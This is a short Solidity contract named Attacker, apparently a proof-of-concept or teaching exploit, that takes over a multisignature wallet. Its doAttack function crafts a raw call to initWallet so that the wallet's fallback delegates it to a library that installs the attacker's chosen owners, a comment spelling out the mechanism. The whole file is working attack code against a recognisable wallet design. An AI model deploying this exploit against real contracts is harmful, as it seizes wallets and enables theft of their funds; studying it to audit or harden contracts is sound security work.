pragma solidity 0.5.10;

contract Attacker {
    address payable walletAdr;

    constructor(address payable _walletAdr) public {
        walletAdr = _walletAdr;
    }
    
    /**
     * This function calls initWallet on the Wallet contract
     * Since Wallet does not have this function, it runs its fallback
     * and that delegates it to the library 
     * Library sets new owners for the contract
     */
    function doAttack(address[] memory _owners) public {
        bytes4 sig = bytes4(keccak256("initWallet(address[])"));
        uint256 pointer = uint256(32);
        (bool res,) = walletAdr.call(abi.encodePacked(sig, pointer, _owners.length, _owners));
    }
}